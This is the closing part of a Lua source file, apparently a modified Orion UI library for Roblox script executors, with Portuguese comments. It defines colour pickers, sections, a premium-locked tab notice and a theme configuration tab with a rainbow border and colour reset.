				function Colorpicker:Set(Value)
					Colorpicker.Value = Value
					ColorpickerBox.BackgroundColor3 = Colorpicker.Value
					
					-- 🔧 ATUALIZAR POSIÇÃO DAS BOLINHAS (CORRIGIDO)
					local H, S, V = Color3.toHSV(Value)
					ColorH, ColorS, ColorV = H, S, V
					
					-- Atualizar posição da bolinha de cor
					ColorSelection.Position = UDim2.new(S, 0, 1 - V, 0)
					
					-- Atualizar posição da bolinha de matiz
					HueSelection.Position = UDim2.new(0.5, 0, 1 - H, 0)
					
					-- Atualizar cor de fundo do seletor
					Color.BackgroundColor3 = Color3.fromHSV(H, 1, 1)
					ColorpickerConfig.Callback(Value)
					SaveCfg(game.GameId)
				end

				Colorpicker:Set(ColorpickerConfig.Default)
				if ColorpickerConfig.Flag then				
					OrionLib.Flags[ColorpickerConfig.Flag] = Colorpicker
				end
				
				-- Registrar Colorpicker para pesquisa
				table.insert(SearchableElements, {
					Name = ColorpickerConfig.Name,
					TabName = TabConfig.Name,
					Type = "Colorpicker",
					Frame = ColorpickerFrame
				})
				
				return Colorpicker
			end

			return ElementFunction   
		end

		function ElementFunction:AddSection(SectionConfig)
			SectionConfig.Name = SectionConfig.Name or "Section"

			local SectionFrame = SetChildren(SetProps(MakeElement("TFrame"), {
				Size = UDim2.new(1, 0, 0, 26),
				Parent = Container
			}), {
				AddThemeObject(SetProps(MakeElement("Label", SectionConfig.Name, 14), {
					Size = UDim2.new(1, -12, 0, 16),
					Position = UDim2.new(0, 0, 0, 3),
					Font = Enum.Font.GothamSemibold
				}), "TextDark"),
				SetChildren(SetProps(MakeElement("TFrame"), {
					AnchorPoint = Vector2.new(0, 0),
					Size = UDim2.new(1, 0, 1, -24),
					Position = UDim2.new(0, 0, 0, 23),
					Name = "Holder"
				}), {
					MakeElement("List", 0, 6)
				}),
			})

			AddConnection(SectionFrame.Holder.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
				SectionFrame.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y + 31)
				SectionFrame.Holder.Size = UDim2.new(1, 0, 0, SectionFrame.Holder.UIListLayout.AbsoluteContentSize.Y)
			end)
			
			-- Registrar section para busca (NÃO aparece, só controla visibilidade)
			table.insert(SearchableElements, {
				Name = SectionConfig.Name,
				TabName = TabConfig.Name,
				Type = "Section",
				Frame = SectionFrame,
				IsSection = true -- Flag especial para sections
			})

			local SectionFunction = {}
			for i, v in next, GetElements(SectionFrame.Holder) do
				SectionFunction[i] = v 
			end
			return SectionFunction
		end	

		for i, v in next, GetElements(Container) do
			ElementFunction[i] = v 
		end

		if TabConfig.PremiumOnly then
			for i, v in next, ElementFunction do
				ElementFunction[i] = function() end
			end    
			Container:FindFirstChild("UIListLayout"):Destroy()
			Container:FindFirstChild("UIPadding"):Destroy()
			SetChildren(SetProps(MakeElement("TFrame"), {
				Size = UDim2.new(1, 0, 1, 0),
				Parent = ItemParent
			}), {
				AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://3610239960"), {
					Size = UDim2.new(0, 18, 0, 18),
					Position = UDim2.new(0, 15, 0, 15),
					ImageTransparency = 0.4
				}), "Text"),
				AddThemeObject(SetProps(MakeElement("Label", "Unauthorised Access", 14), {
					Size = UDim2.new(1, -38, 0, 14),
					Position = UDim2.new(0, 38, 0, 18),
					TextTransparency = 0.4
				}), "Text"),
				AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://4483345875"), {
					Size = UDim2.new(0, 56, 0, 56),
					Position = UDim2.new(0, 84, 0, 110),
				}), "Text"),
				AddThemeObject(SetProps(MakeElement("Label", "Premium Features", 14), {
					Size = UDim2.new(1, -150, 0, 14),
					Position = UDim2.new(0, 150, 0, 112),
					Font = Enum.Font.GothamBold
				}), "Text"),
				AddThemeObject(SetProps(MakeElement("Label", "This part of the script is locked to Sirius Premium users. Purchase Premium in the Discord server (discord.gg/sirius)", 12), {
					Size = UDim2.new(1, -200, 0, 14),
					Position = UDim2.new(0, 150, 0, 138),
					TextWrapped = true,
					TextTransparency = 0.4
				}), "Text")
			})
		end
		return ElementFunction   
	end  
	
	--  FUNÇÃO: Adicionar Aba de Configurações (COMPLETA COM SAVE)
	function TabFunction:AddConfigTab()
		-- Carregar configurações ANTES de criar a aba Config
		OrionLib:Init()
		
		local ConfigTab = TabFunction:MakeTab({
			Name = "Config",
			Icon = "rbxassetid://7734053426",
			PremiumOnly = false
		})
		
		-- LANGUAGE SYSTEM REMOVED (Translation system removed)
		
		local RainbowEnabled = false
		local RainbowConnection
		local OriginalStrokeColor = OrionLib.Themes[OrionLib.SelectedTheme].Stroke
		
		ConfigTab:AddToggle({
			Name = " Rainbow Border",
			Default = false,
			Flag = "RainbowBorder",
			Save = true,
			Callback = function(Value)
				RainbowEnabled = Value
				
				if RainbowEnabled then
					-- Salvar cor original
					OriginalStrokeColor = OrionLib.Themes[OrionLib.SelectedTheme].Stroke
					
					-- Criar UIGradient suave
					local MainWindowStroke = MainWindow:FindFirstChildOfClass("UIStroke")
					if MainWindowStroke then
						-- Remover gradient antigo
						local oldGradient = MainWindowStroke:FindFirstChild("RainbowGradient")
						if oldGradient then oldGradient:Destroy() end
						
						-- Criar gradient
						local gradient = Instance.new("UIGradient")
						gradient.Name = "RainbowGradient"
						gradient.Parent = MainWindowStroke
						
						-- Animação suave
						local rotation = 0
						RainbowConnection = RunService.RenderStepped:Connect(function(delta)
							if not RainbowEnabled then return end
							
							-- Rotação suave (360° em ~10 segundos)
							rotation = (rotation + delta * 36) % 360
							gradient.Rotation = rotation
							
							-- 5 cores suaves
							local hue1 = (rotation / 360) % 1
							local hue2 = ((rotation / 360) + 0.2) % 1
							local hue3 = ((rotation / 360) + 0.4) % 1
							local hue4 = ((rotation / 360) + 0.6) % 1
							local hue5 = ((rotation / 360) + 0.8) % 1
							
							-- Saturação 0.85 = cores vibrantes mas não muito fortes
							gradient.Color = ColorSequence.new({
								ColorSequenceKeypoint.new(0, Color3.fromHSV(hue1, 0.85, 1)),
								ColorSequenceKeypoint.new(0.25, Color3.fromHSV(hue2, 0.85, 1)),
								ColorSequenceKeypoint.new(0.5, Color3.fromHSV(hue3, 0.85, 1)),
								ColorSequenceKeypoint.new(0.75, Color3.fromHSV(hue4, 0.85, 1)),
								ColorSequenceKeypoint.new(1, Color3.fromHSV(hue5, 0.85, 1))
							})
						end)
					end
				else
					-- Parar rainbow
					if RainbowConnection then
						RainbowConnection:Disconnect()
						RainbowConnection = nil
					end
					
					-- Remover gradient e restaurar cor
					local MainWindowStroke = MainWindow:FindFirstChildOfClass("UIStroke")
					if MainWindowStroke then
						local gradient = MainWindowStroke:FindFirstChild("RainbowGradient")
						if gradient then
							gradient:Destroy()
						end
						MainWindowStroke.Color = OriginalStrokeColor
					end
					OrionLib.Themes[OrionLib.SelectedTheme].Stroke = OriginalStrokeColor
					SetTheme()
				end
			end
		})
		
		-- Colorpicker para Accent/Bordas
		ConfigTab:AddColorpicker({
			Name = " Accent Color",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].Stroke,
			Flag = "AccentColor",
			Save = true,
			Callback = function(Value)
				if RainbowEnabled then
					RainbowEnabled = false
					if RainbowConnection then
						RainbowConnection:Disconnect()
						RainbowConnection = nil
					end
				end
				
				OriginalStrokeColor = Value
				
				OrionLib.Themes[OrionLib.SelectedTheme].Stroke = Value
				SetTheme()
				
				local MainWindowStroke = MainWindow:FindFirstChildOfClass("UIStroke")
				if MainWindowStroke then
					TweenService:Create(MainWindowStroke, TweenInfo.new(0.3), {Color = Value}):Play()
				end
				
				SaveCfg(game.GameId)
			end    
		})
		
		-- Colorpicker para Fundo
		ConfigTab:AddColorpicker({
			Name = " Background Color",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].Main,
			Flag = "BackgroundColor",
			Save = true,
			Callback = function(Value)
				OrionLib.Themes[OrionLib.SelectedTheme].Main = Value
				SetTheme()
				SaveCfg(game.GameId)
			end    
		})
		
		-- Colorpicker para TEXTO
		ConfigTab:AddColorpicker({
			Name = " Text Color",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].Text,
			Flag = "TextColor",
			Save = true,
			Callback = function(Value)
				OrionLib.Themes[OrionLib.SelectedTheme].Text = Value
				SetTheme()
				SaveCfg(game.GameId)
			end    
		})
		
		-- Colorpicker para TEXTO SECUNDÁRIO
		ConfigTab:AddColorpicker({
			Name = " Secondary Text",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].TextDark,
			Flag = "TextDarkColor",
			Save = true,
			Callback = function(Value)
				OrionLib.Themes[OrionLib.SelectedTheme].TextDark = Value
				SetTheme()
				SaveCfg(game.GameId)
			end    
		})
		
		ConfigTab:AddColorpicker({
			Name = " Panel Color",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].Second,
			Flag = "SecondColor",
			Save = true,
			Callback = function(Value)
				OrionLib.Themes[OrionLib.SelectedTheme].Second = Value
				SetTheme()
				SaveCfg(game.GameId)
			end    
		})
		
		ConfigTab:AddColorpicker({
			Name = " Items Background",
			Default = OrionLib.Themes[OrionLib.SelectedTheme].Divider,
			Flag = "DividerColor",
			Save = true,
			Callback = function(Value)
				OrionLib.Themes[OrionLib.SelectedTheme].Divider = Value
				SetTheme()
				SaveCfg(game.GameId)
			end    
		})
		
		ConfigTab:AddButton({
			Name = " Reset to Default",
			Callback = function()
				OrionLib.Themes[OrionLib.SelectedTheme] = {
					Main = Color3.fromRGB(25, 25, 25),
					Second = Color3.fromRGB(32, 32, 32),
					Stroke = Color3.fromRGB(60, 60, 60),
					Divider = Color3.fromRGB(60, 60, 60),
					Text = Color3.fromRGB(240, 240, 240),
					TextDark = Color3.fromRGB(150, 150, 150)
				}
				OriginalStrokeColor = OrionLib.Themes[OrionLib.SelectedTheme].Stroke
				SetTheme()
				SaveCfg(game.GameId)
				OrionLib:MakeNotification({
					Name = " Reset Complete",
					Content = "All colors have been reset to default!",
					Time = 3
				})
			end
		})

		return ConfigTab
	end
	
	return TabFunction
end   

-- Final security layer (FOURTH LAYER) - DESABILITADO PARA VELOCIDADE

-- Salvar OrionLib globalmente para acesso externo
getgenv().OrionLib = OrionLib

return OrionLib
